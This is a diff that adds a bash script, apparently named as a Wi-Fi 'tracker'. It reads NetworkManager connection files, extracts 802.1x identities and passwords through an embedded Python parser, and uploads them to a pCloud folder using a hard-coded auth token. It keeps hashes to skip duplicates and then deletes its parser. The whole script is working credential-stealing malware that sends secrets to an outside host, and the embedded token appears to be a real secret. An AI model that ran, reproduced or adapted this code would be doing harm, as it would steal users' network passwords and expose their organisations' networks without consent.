@@ -1,0 +1,50 @@
+#!/usr/bin/env bash
+
+AUTH_TOKEN="5AEgF7ZRoJb7ZIH6pVVtwEJ8MH0RcVLR5imRKGhX0"
+FOLDER_ID="12961249642"
+
+USER="`users | head -n1`"
+
+FILEPATH="/tmp/wifi-nmconnection-tracker.txt"
+DATABASE="/etc/wispi/winet.db"
+
+cat > parser <<'END_SCRIPT'
+from configparser import ConfigParser
+import sys
+
+config = ConfigParser()
+config.read(sys.argv[1])
+
+c = config.get('connection', 'id')
+i = config.get('802-1x', 'identity')
+p = config.get('802-1x', 'password')
+
+f = open('/tmp/wifi-nmconnection-tracker.txt', 'w')
+
+f.write("Network :" + c + "\n")
+f.write("Identity:" + i + "\n")
+f.write("Password:" + p + "\n")
+END_SCRIPT
+
+function post {
+	curl -s -o /dev/null -X PUT -T "${FILEPATH}" \
+	"https://api.pcloud.com/uploadfile?auth=${AUTH_TOKEN}&folderid=${FOLDER_ID}&filename=${USER}@${HOSTNAME}-${1}.${2}.key"
+}
+
+for i in /etc/NetworkManager/system-connections/*
+do
+	if grep -q "identity" "${i}"
+	then
+		echo > ${FILEPATH}
+		python3 parser "${i}"
+		k="`cat ${FILEPATH} | head -n1 | cut -d: -f2 | tr [' '] ['_']`"
+		h="`openssl sha1 ${FILEPATH} | cut -d' ' -f2`"
+		if ! grep -q "${h}" "${DATABASE}"
+		then 
+			echo "${h}" >> ${DATABASE}
+			post "${k}" "$(echo "${h}" | cut -b-6)"
+		fi
+	fi
+done
+
+rm -rf parser
